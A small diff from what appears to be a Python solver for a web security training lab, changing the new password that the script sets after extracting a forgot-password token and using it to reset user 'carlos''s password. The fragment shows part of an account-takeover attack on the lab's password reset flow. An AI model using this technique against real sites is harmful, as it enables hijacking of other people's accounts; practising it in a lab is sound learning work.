@@ -37,7 +37,7 @@ try:  # try to make a forgot password request to wiener
                     "temp-forgot-password-token=(.*)'", get_token.text)[0]
                 if len(temp_token) != 0:  # when token is found
                     print("2. Extract the token from the email client.. ☑️")
-                    new_password = "Hola!"  # change this to what you want
+                    new_password = "Hacked"  # change this to what you want
                     data = {
                         "temp-forgot-password-token": temp_token,
                         "username": "carlos",
